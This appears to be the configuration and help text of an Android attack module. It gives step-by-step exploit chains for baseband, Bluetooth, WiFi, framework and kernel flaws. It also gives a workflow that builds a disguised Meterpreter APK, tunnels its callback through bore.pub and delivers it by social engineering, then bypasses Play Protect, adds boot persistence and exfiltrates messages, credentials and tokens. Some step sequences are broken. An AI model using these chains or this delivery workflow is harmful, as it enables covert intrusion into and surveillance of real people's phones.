help.description: Android penetration testing framework covering device fingerprinting, static/dynamic app analysis, vulnerability scanning, exploitation testing, network traffic interception, and forensics. Detects 50+ vulnerability types including SQL injection, insecure storage, cleartext traffic, exported components, and more. Includes automated exploitation chains for common Android vulnerabilities.

examples: recon              — Device fingerprint: root/bootloader/SELinux/patch-level/encryption
app_scan           — Static APK analysis: manifest, permissions, secrets, weak crypto, score
vuln_scan          — Device + app CVE assessment with NVD lookup
exploit            — Intent injection, SQLi on content providers, component abuse
network            — tcpdump capture + logcat credential leakage + proxy intercept
forensics          — DB/SharedPreferences extraction, logcat, SMS, ADB backup

cve_database.description: Active CVEs applicable to Android devices in 2024-2026. Mapped to secV operations. Applicability determined during recon by comparing device security_patch date and API level.
cve_database.applicability_logic: By default (show_patched=false): A CVE applies if device security_patch < cve.patch_date AND api_level in cve.affected_api AND vendor filter matches. exynos_baseband.title: Exynos Baseband RCE - internet to baseband, no user interaction
exynos_baseband.description: Google Project Zero. Improper format string validation in Samsung Exynos baseband firmware. Attacker can achieve RCE at baseband level over mobile data or WiFi Calling with no user interaction. 18 related 0-days disclosed simultaneously.

exploit.technique: Baseband RCE via malformed SDP/SIP - Internet-to-Baseband with no user interaction
steps: 1. Confirm target has Exynos chipset and active mobile data or WiFi Calling via recon
2. Craft malicious SIP INVITE with format string payload in SDP 'c=' or 'o=' field targeting Shannon modem parser
3. Deliver over mobile Internet (attacker calls target number) or WiFi Calling - no authentication required
4. Format string write corrupts modem stack - achieve arbitrary write in baseband (ring -3)
5. From baseband: inject shellcode into AP via shared memory IPC channel (MIPI/CP_SHARED_MEM)
6. Chain with kernel LPE for full userspace root
tools: Project Zero PoC (private - no public release)
exploit.outcome: Baseband RCE → AP kernel code execution - zero user interaction, works over mobile internet from anywhere
exploit.constraints: Target requires active mobile data OR WiFi Calling enabled; Exynos chipset required (Shannon modem)

exynos_baseband.title: Exynos Baseband SIP Stack Heap Buffer Overflow
exynos_baseband.description: Heap buffer overflow in SIP packet parsing in Exynos baseband. Part of the Project Zero batch. Enables RCE over VoLTE/WiFi Calling.

exploit.technique: Heap buffer overflow in SIP 'm=' line parser - VoLTE/WiFi Calling delivery
steps: 1. Confirm Exynos chipset and VoLTE or WiFi Calling active via recon
2. Craft SIP INVITE with oversized 'm=' (media description) field in SDP body - exceeds Shannon heap allocation
3. Overflow corrupts adjacent heap chunk metadata in baseband heap allocator
4. Chain with heap spray using repeated malformed SIP re-INVITE to control freed region
5. Overwrite function pointer in SIP session object - redirect execution to shellcode
6. Pivot to AP kernel via shared memory IPC
exploit.outcome: Baseband heap corruption → code execution via VoLTE/WiFi Calling
exploit.constraints: VoLTE or WiFi Calling must be enabled; Exynos chipset required; no user interaction

exynos_baseband.title: Exynos Baseband NAS Stack OOB Write
exynos_baseband.description: Out-of-bounds write in NAS (Non-Access Stratum) message handling in Exynos baseband.

exploit.technique: OOB write in LTE NAS Attach/Detach message handler via rogue base station
steps: 1. Deploy rogue LTE base station (srsRAN + USRP B210 / LimeSDR)
2. Force target to camp on rogue BS via stronger signal (IMSI catcher mode)
3. Send crafted LTE NAS Attach Request with oversized IMSI/TMSI container field
4. Shannon NAS handler writes beyond allocated buffer - OOB write in modem stack
5. Overwrite adjacent modem task control block - hijack modem thread execution
exploit.outcome: OOB write in NAS stack → arbitrary code execution in Exynos modem
exploit.constraints: Requires rogue LTE base station hardware; target must camp on attacker BS; Exynos modem required

exynos_baseband.title: Exynos Baseband Memory Corruption in IMS
exynos_baseband.description: Memory corruption in IMS (IP Multimedia Subsystem) handler in Exynos modem firmware.

exploit.technique: Memory corruption in IMS SIP registration handler via crafted P-Asserted-Identity header
steps: 1. Connect to same IMS/VoLTE network as target or deploy rogue IMS server
2. Send crafted SIP REGISTER with oversized P-Asserted-Identity or Contact header
3. IMS handler performs unchecked memcpy - corruption of adjacent IMS session buffer
4. Use-after-free condition created on deregistration sequence
5. Spray IMS session pool to reclaim freed object with controlled content
exploit.outcome: IMS handler memory corruption → code execution in Exynos baseband
exploit.constraints: Adjacent IMS/VoLTE network required; Exynos 7904 or Exynos 850 modem; patch < 2023-03-01

android_framework.title: Android Framework - createPackageContextAsUser Privilege Escalation
android_framework.description: Flaw in createPackageContextAsUser() allows an installed app (no special permissions) to execute code in the context of another installed app. Enables cross-app data access without root.
android_framework.secv_integration: Post-APK-install privilege escalation via P&D payload

exploit.technique: createPackageContextAsUser() sandbox bypass - arbitrary cross-app data read without root
steps: 1. Install secV payload APK on target device via any delivery method
2. Call createPackageContextAsUser(targetPackage, flags, uid) to obtain target app context
3. Use context.getFilesDir() / context.getDatabasePath() to enumerate target app private storage
4. Read SharedPreferences XML, SQLite DBs, and auth tokens directly from target app sandbox
5. Exfiltrate via C2 channel (bore tunnel / HTTP POST)
6. Chain with CVE-2024-31317 for full root escalation
exploit.outcome: Full cross-app private data exfiltration without root; pivot to CVE-2024-31317 for uid=0
exploit.constraints: Requires installed APK; API 28-34 only; patch < 2024-03-01

android_framework.title: Android Zygote Privilege Escalation
android_framework.description: Privilege escalation via Android Zygote process. Allows installed app to gain elevated privileges. Requires malicious APK.

exploit.technique: Command injection via ActivityManager.setProcessMemoryTrimLevel() → Zygote executes attacker-controlled command as system
steps: 1. Install APK with any permissions (none specific required for this path)
2. Call ActivityManager.setProcessMemoryTrimLevel(processName, ...) where processName contains shell metacharacters
3. Zygote interprets process name as shell command - arbitrary code execution as UID=system (1000)
4. Drop reverse shell or write persistence payload to /data/local/tmp/
5. If device has Magisk: chain su call to reach uid=0
exploit.outcome: System-level code execution (uid=1000) via Zygote injection; root via Magisk chain
exploit.constraints: API 28-34; requires APK install or adb shell access; patch < 2024-06-01

android_framework.title: Android Framework LaunchAnyWhere
android_framework.description: Privilege escalation via improper access control in Android Framework. No additional permissions required.

exploit.technique: Improper access control in Framework allows launching restricted Activities without permissions
steps: 1. Install malicious APK (zero permissions needed)
2. Craft Intent targeting non-exported Activity in system app (e.g. Settings, AccountManager)
3. Use FLAG_ACTIVITY_NEW_TASK + matching taskAffinity to bypass exported=false restriction
4. Launch: Settings > Developer Options enablement, Unknown Sources toggle, or ADB over WiFi pairing dialog
5. Use launched system Activity to silently change security settings or install additional payloads
exploit.outcome: Arbitrary system Activity launch → security settings manipulation without user awareness

android_framework.title: Android Documents UI Path Traversal - actively exploited in-the-wild
android_framework.description: Path traversal vulnerability in Android Documents UI. Allows app to access files outside its sandbox. CISA added to KEV catalog - confirmed active exploitation.

exploit.technique: Path traversal via crafted content:// URI in DocumentsUI - read arbitrary files outside app sandbox
steps: 1. Install payload APK or use adb shell to invoke DocumentsProvider intent
2. Craft content://com.android.externalstorage.documents/document/primary:../../../data/data/ URI
3. DocumentsUI resolves traversal without sanitizing path components
4. Receive file descriptor pointing to target app private directory
5. Read /data/data/<target>/databases/*.db, SharedPreferences/*.xml, files/credentials
6. Exfiltrate: banking credentials, session tokens, chat history, private keys
exploit.outcome: Cross-app file exfiltration via path traversal - confirmed actively exploited by threat actors
exploit.constraints: API 29-35; requires installed APK or adb shell; patch < 2024-11-01

android_framework.title: MediaCodec Use-After-Free RCE
android_framework.description: Use-after-free in Android MediaCodec. Allows remote code execution via malicious media file. No user interaction beyond opening file.

exploit.technique: Use-after-free in MediaCodec decoder - RCE via malicious media file or stream
steps: 1. Craft malicious MP4/MKV container with specially formatted codec configuration box triggering UAF in MediaCodec
2. Deliver via: MMS attachment, email link, messaging app preview, or web page embedding malicious media
3. UAF triggered in mediaserver process (UID=media, isolated from main app context)
4. Spray mediaserver heap: send repeated decoder init/teardown cycles to control freed codec object
5. Overwrite MediaCodec vtable pointer - redirect to shellcode
6. From mediaserver: pivot to higher privilege via Binder IPC to system_server
exploit.outcome: RCE in mediaserver (UID=media) via media file - minimal user interaction (tap link/open file)
exploit.constraints: API 28-33; target must open or preview crafted media file; patch < 2023-03-01

android_framework.title: FreeType OOB Write - actively exploited against Android
android_framework.description: Out-of-bounds write in FreeType font rendering library (libfreetype). Android bundles FreeType for font rendering - exploitable via malicious font file in web page, document, or app. Active exploitation confirmed by Google TAG in 2025.
android_framework.delivery: Malicious web page → Chrome/WebView → font parsing → RCE

exploit.technique: OOB write in libfreetype font glyph parser - RCE via malicious web page served over WAN
steps: 1. Craft malicious OpenType/TTF font file with invalid glyph data triggering OOB write in FT_Load_Glyph()
2. Embed font in HTML page via @font-face CSS rule
3. Host on bore WAN tunnel: bore local --to bore.pub 8080
4. Deliver link to target via any social engineering channel (SMS, WhatsApp, email)

6. Spray renderer heap to control OOB destination - overwrite function pointer
7. Escape renderer sandbox via Binder to achieve full app-level code execution
exploit.outcome: RCE in Chrome/WebView renderer - confirmed actively exploited in-the-wild by Google TAG
exploit.constraints: Any API level with libfreetype < 2.13.3; target must visit attacker URL; patch < 2025-04-01

bluetooth.title: Bluetooth HID Keyboard Injection - no pairing required
bluetooth.description: Unauthenticated Bluetooth HID (Human Interface Device) injection. Attacker within Bluetooth range can inject keystrokes as if a keyboard is paired - no pairing, no confirmation required. Enables silent APK install, settings change, URL navigation.
bluetooth.prerequisites: Bluetooth enabled on target, attacker within range
bluetooth.secv_integration: bt_hid_inject op - type install URL + enable unknown sources

exploit.technique: Rogue Bluetooth HID keyboard - inject keystrokes without pairing or confirmation
steps: 1. Position attacker device within Bluetooth range (~10m) of target
2. Use btlejuice/PoC tool to present as HID keyboard without going through pairing ceremony (CVE-specific bypass of pairing enforcement)
3. Inject key sequence: open URL bar, navigate to hosted APK, confirm install prompts
4. Alternative Android 11+ path: inject Wi-Fi ADB pairing code sequence via Settings > Developer Options
5. Once APK installed or ADB paired, secV C2 connection established
exploit.outcome: Silent APK install and persistence via Bluetooth proximity - no user interaction required
exploit.constraints: Bluetooth must be enabled on target; attacker within ~10m; patch < 2023-12-01

bluetooth.title: Android Bluetooth Use-After-Free - zero-click RCE
bluetooth.description: Use-after-free in Android Bluetooth stack (l2c_rcv_acl_data). Can lead to RCE with no user interaction when Bluetooth is enabled. Zero-click.

exploit.technique: Use-after-free in Bluetooth l2c_rcv_acl_data() - zero-click RCE via crafted ACL packet
steps: 1. Identify target device with Bluetooth enabled (discoverable or previously seen) via BT scan
2. Establish or spoof ACL connection to target BD_ADDR
3. Send crafted L2CAP ACL data packet triggering UAF in l2c_rcv_acl_data() during teardown race
4. Freed bt_conn struct reclaimed via Binder buffer spray - control vtable pointer
5. Execute shellcode in com.android.bluetooth process (UID=1002, bluetooth group)
6. From bluetooth process: pivot to system_server via Binder IPC privilege chain
tools: custom PoC (no public release - research PoC only)

exploit.constraints: Bluetooth must be enabled; attacker within Bluetooth range (~100m class 1); patch < 2023-12-01

bluetooth.title: Bluetooth Access Control Bypass
bluetooth.description: Missing permission check in Android Bluetooth subsystem allows bypass of access controls.

exploit.technique: Missing BLUETOOTH_PRIVILEGED check in HFP profile handler - AT command execution without permission
steps: 1. Establish Bluetooth connection with target (HFP hands-free profile)
2. Send AT+BRSF (Bluetooth Retrieve Supported Features) without BLUETOOTH_PRIVILEGED permission
3. HFP handler processes command - missing permission check allows restricted profile operations
4. Read phonebook contacts, initiate outgoing calls, or inject audio path manipulation
5. Chain with proximity for further social engineering or data collection
exploit.outcome: Bluetooth HFP access control bypass - phonebook read and call initiation without permissions

samsung_specific.title: Samsung Kernel Log File - pointer leak
samsung_specific.description: Samsung-specific kernel log file is world-readable. Contains kernel pointer addresses, defeating KASLR (Kernel Address Space Layout Randomization). Useful as info-leak primitive to enable follow-on kernel exploits.
samsung_specific.secv_integration: recon op reads /proc/kmsg or logcat for pointer leaks

exploit.technique: World-readable Samsung kernel log file - extract KASLR base address to enable reliable kernel ROP
steps: 1. Confirm Samsung manufacturer and patch < 2023-05-01 via recon
2. Read /proc/kmsg or Samsung-specific log path (e.g. /data/log/dumpstate/) without root
3. Parse output with grep pattern matching kernel virtual addresses (0xffffffc0xxxxxxxx or 0xffff...)
4. Identify leaked address of known kernel symbol (e.g. __log_buf, init_task, kallsyms)
5. Calculate KASLR slide: leaked_addr - compiled_symbol_offset
6. Provide computed slide to kernel exploit payload (CVE-2023-0266 or CVE-2024-53104) for deterministic ROP
exploit.outcome: KASLR defeated - kernel base address known; prerequisite for reliable kernel exploit chaining
exploit.constraints: Samsung devices only; patch < 2023-05-01; low-privilege app or shell access sufficient

samsung_specific.title: Samsung SmartSwitch Arbitrary Code Execution
samsung_specific.description: Arbitrary code execution via SmartSwitch backup/restore functionality. Malicious backup file triggers code execution during restore.

exploit.technique: Path traversal in SmartSwitch backup archive extraction - ACE in privileged Samsung system app context
steps: 1. Craft malicious SmartSwitch backup (.sbu) archive with Zip Slip path traversal entries
2. Embed entries with filenames containing '../../../' pointing to SmartSwitch app private directory
3. Include malicious .so library as one of the traversal-written files
4. Deliver backup file to target (USB cable, ADB push, or cloud sync)
5. User triggers SmartSwitch restore - app extracts archive without sanitizing paths
6. Malicious .so written to SmartSwitch data dir - loaded on next SmartSwitch launch
7. Code executes in SmartSwitch context (Samsung system app with privileged permissions)
exploit.outcome: ACE as privileged Samsung system app - access to device backup data, contacts, messages
exploit.constraints: SmartSwitch must be installed; user must initiate restore; Samsung devices only; patch < 2024-09-01

affected_devices: Samsung devices with Exynos WiFi chipset (WLAN driver)
samsung_specific.title: Samsung Exynos WLAN OOB Write - zero-click WiFi RCE
samsung_specific.description: Out-of-bounds write in Samsung Exynos WiFi driver (wl18xx/dhd). No user interaction required - attacker on same WiFi network or within WiFi range can trigger RCE. Affects Exynos devices with Broadcom/Samsung WiFi chipsets.
samsung_specific.prerequisites: Same WiFi network or WiFi probe frame range

exploit.technique: OOB write in Samsung Exynos WLAN kernel driver (dhd.ko) - zero-click kernel RCE via WiFi management frame
steps: 1. Confirm target is on same WiFi network or within WiFi probe response range
2. Send crafted 802.11 Probe Response or Beacon frame with malformed Information Element (IE) field
3. Exynos dhd.ko WiFi driver processes IE without proper bounds check - OOB write in kernel memory
4. No user interaction required - driver processes management frames automatically
5. Spray kernel heap via repeated crafted frames to control OOB destination
6. Overwrite kernel cred struct or function pointer - achieve ring-0 execution
7. Install persistent kernel backdoor or drop elevated shell
exploit.outcome: Zero-click kernel RCE over WiFi - no user interaction; persistent root
exploit.constraints: Samsung devices with Exynos WiFi chipset (dhd driver); attacker on same network or WiFi frame range; patch < 2024-03-01

kernel_lpe.title: Linux Kernel ALSA Use-After-Free - LPE
kernel_lpe.description: Use-after-free in Linux kernel ALSA sound subsystem (snd_ctl_elem_read). Local privilege escalation to root. Affects Android kernels 4.4-5.10 - Samsung A30 runs kernel 4.4.177.
kernel_lpe.secv_integration: get_root op - kernel LPE fallback if Magisk not present

exploit.technique: Use-after-free in ALSA snd_ctl_elem_read() - race condition LPE to uid=0
steps: 1. Confirm kernel version 4.4-5.10 and patch < 2023-03-01 via recon
2. Push exploit binary to /data/local/tmp/ via adb or installed APK
3. Open /dev/snd/controlC0 from two threads; trigger race: free snd_ctl_elem in thread A while thread B holds reference in snd_ctl_elem_read()
4. Freed snd_ctl_elem reclaimed via /dev/kmem pipe spray or userfaultfd - fill with ROP chain
5. snd_ctl_elem_read() dereferences freed object - executes attacker ROP chain in kernel context
6. ROP chain: overwrite current->cred uid/gid fields to 0 - return to userspace as root
7. Spawn root shell or write su binary
exploit.outcome: Kernel LPE to uid=0 root - effective on kernel 4.4.x through 5.10.x; bypasses SELinux via context rewrite
exploit.constraints: Kernel 4.4.x-5.10.x; patch < 2023-03-01; any app-level code execution required

kernel_lpe.title: Linux Kernel StackRot - VMA linked list corruption LPE
kernel_lpe.description: Vulnerability in Linux kernel memory management (mm/maple_tree.c). Stack-based privilege escalation to root. Named StackRot.

exploit.technique: Maple tree node rotation race condition - VMA UAF leading to controlled kernel write
steps: 1. Confirm kernel 6.1-6.3 via recon (uname -r)
2. Push StackRot exploit binary to /data/local/tmp/
3. Trigger mmap()/munmap() sequence to force maple tree B-tree rotation in kernel VMA manager
4. Race: node rotation frees old maple tree node while another thread holds stale pointer
5. Reclaim freed maple_node with controlled userland data (userfaultfd / FUSE stall trick)
6. VMA traversal dereferences attacker-controlled maple_node - arbitrary kernel write primitive
7. Overwrite kernel cred structure - escalate to uid=0
exploit.outcome: Kernel LPE to root via VMA maple tree UAF - affects kernel 6.1-6.3
exploit.constraints: Kernel 6.1.x-6.3.x only (maple tree VMA); requires local code execution

kernel_lpe.title: Linux Kernel USB Video Class OOB Write - LPE, actively exploited
kernel_lpe.description: Out-of-bounds write in Linux kernel USB video class (UVC) driver. Exploitable via malicious USB device or crafted UVC packets. CISA KEV - confirmed active exploitation against Android.

exploit.technique: OOB write in Linux kernel UVC driver (uvc_parse_streaming) - LPE via malicious USB or crafted UVC frame
steps: 1. Confirm patch < 2025-02-01 via recon
2. Deliver exploit via: (a) malicious USB video device plugged in, OR (b) crafted UVC frame injection via kernel socket
3. uvc_parse_streaming() parses UVC descriptor - skips UVC_VS_UNDEFINED frames but miscalculates buffer index for subsequent frames
4. OOB write beyond allocated streaming interface array - corrupts adjacent kernel object
5. Spray kernel heap to land attacker data at corruption target (pipe_buffer / msg_msg spray)
6. Achieve arbitrary kernel write - overwrite cred struct uid fields
7. Root shell spawned; confirmed actively weaponized by threat actors in-the-wild
exploit.outcome: Kernel LPE to root via UVC driver OOB - confirmed active exploitation in-the-wild; any API level
exploit.constraints: Physical USB access for hardware path; any API level; patch < 2025-02-01

recon_chain.description: secV recon op CVE applicability check sequence. Run automatically on recon - surfaces HIGH/CRITICAL applicable CVEs in findings.
steps: 1. Read ro.build.version.security_patch → parse as YYYY-MM-DD
2. Read ro.product.cpu.abi → detect arm64 / x86
3. Read ro.build.version.sdk → determine API level
4. Read ro.product.manufacturer + ro.product.model → detect Samsung / Exynos
5. Read uname -r → parse kernel version
6. Check getprop ro.boot.verifiedbootstate → orange = unlocked
7. Match patch_date + api_level + chipset against cve_database[]
8. Output: list of applicable CVEs sorted by CVSS descending
9. Flag IN_THE_WILD CVEs with CRITICAL priority in findings
10. Map each CVE to recommended secv_op for exploitation phase

wan_delivery_workflow.description: End-to-end guide for standalone APK payload delivery over WAN (mobile internet / remote target). No USB cable required. Uses bore tunnels for both the MSF callback and APK HTTP delivery.
prerequisites: bore installed (yay -S bore-bin  |  cargo install bore-cli)
secv.keystore generated (Setup tab → Signing Keystore → Generate)
secV GUI running: secv android --mode gui

steps.title: Open a bore MSF callback tunnel
steps.detail: Run this in a terminal BEFORE building the APK - the bore-assigned port must be baked into the payload binary.
steps.note: Note the remote port printed, e.g. bore.pub:37821. This becomes LHOST=bore.pub LPORT=37821 in the APK.

steps.title: Configure P&D tab - Payload
steps.detail: Open GUI → P&D tab → Payload row.

settings.Type: reverse_https  (WAN stealth - looks like HTTPS to ISP filters)

settings.App Label: Samsung Services  (or any convincing app name for target)

steps.title: Configure P&D tab - Delivery
steps.detail: Select WAN HTTPS delivery. This opens a second bore tunnel to serve the APK file.
steps.note: Click the start button. GUI shows a public bore URL, e.g. https://bore.pub:YYYYY. This is the download link for the APK.

steps.title: Start MSF handler
steps.detail: Click ⚡ handler in the P&D tab. This launches msfconsole with the correct payload, LHOST, and LPORT matching Step 1.
steps.verify: Switch to MSF tab - should show 'Started reverse TCP handler on bore.pub:XXXXX'

steps.title: Build APK
steps.detail: Click ▶ BUILD & INJECT. msfvenom generates the payload, APK is signed with secv.keystore.
steps.output: Signed APK appears in output/ directory. File manager tab shows it.

steps.title: Deliver to target
options: QR code: click QR button in Delivery row → scan with target device camera
URL: copy bore WAN URL → send via SMS, email, or social engineering
Physical: copy APK to USB stick and hand-deliver
steps.target_sideload: Settings → Biometrics & Security → Install unknown apps → enable for browser

steps.title: Catch session
steps.detail: Target installs and opens APK → callback fires through bore → MSF tab shows new Meterpreter session.
steps.verify: MSF tab: 'Meterpreter session N opened (bore.pub:XXXXX → target:PORT)'

steps.title: Add boot persistence (WAN)
steps.detail: With MSF session open, run the rebuild operation from Terminal tab. Injects DexClassLoader stager into BootBuddy APK - survives reboots over WAN bore tunnel.
steps.command: set operation rebuild; set msf true; set msf_lport 4444; run <serial>
steps.note: rebuild uses bore_msf_port (default 37993) as the persistent callback tunnel. Run bore local 4444 --to bore.pub --remote-port 37993 to pin the port.

nb.description: NB - Important notes for secV android_pentest module users. Read before running any operation.

for_users.note: Always use reverse_https for WAN (mobile internet) targets. reverse_tcp is blocked or throttled by most mobile ISPs. bore.pub provides a free TCP tunnel - the remote port is random and must be noted BEFORE building the APK since the port is compiled into the binary.

To get a stable bore port across sessions, specify --remote-port: 'bore local 4444 --to bore.pub --remote-port 37993'. If 37993 is taken bore.pub will reject - use a different port. The rebuild operation defaults to bore_msf_port=37993 and bore_dex_port=21062.

secv.keystore lives in tools/mobile/android/apk_backdoor/. Do NOT commit it to any repo. Regenerate from Setup tab → Signing Keystore whenever you need a fresh certificate identity. build_bootbuddy.py reads keystore.json for password and alias - GUI keeps this in sync automatically.

Always enable Bypass Play Protect in P&D options for real-world delivery. This renames the package, scrubs dangerous manifest flags, injects a junk class, and re-signs. Without it Google Play Protect will flag the APK on install.

Knox does not automatically block sideloaded user-space payloads unless a MDM profile or Secure Folder is active. If Knox is fully active (enterprise enrollment), the payload may be quarantined. Test with Secure Folder disabled for baseline results.

Android 11 (API 30): Settings → Biometrics & Security → Install unknown apps → enable for the browser or file manager the user downloads with. This requires physical access or social engineering. QR code delivery works well - camera apps on Samsung open Chrome directly.

Android 14 with December 2024 patches restricts implicit intents and tightens BOOT_COMPLETED. For Android 14 targets use APK injection into a valid real app (-x template backdoor) rather than standalone payload. The inject does not touch BOOT_COMPLETED - it piggybacks the host app's existing permission set and launch path.

Standard Meterpreter on unrooted Android 11/14 gives a sandboxed shell (app UID). You can dump app-specific files, SMS (on Samsung via content provider), call log, and camera/mic with permissions already in the APK manifest. Root gives full /data read, tcpdump, and kernel module loading. Test both paths - most real targets are unrooted.

Use Findings tab after recon + exploit ops to review auto-captured findings. Export button saves JSON. For a full formatted report run the built-in report generator: Terminal tab → type 'report' after a completed session. Report covers: recon fingerprint, vulnerabilities found, sessions established, persistence status, exfil summary.

This module.json is the living reference. After each new device test or discovered technique, update tested_devices[] and nb[] accordingly. The GUI Setup tab and the secvulnhub.github.io documentation site should be updated in parallel.
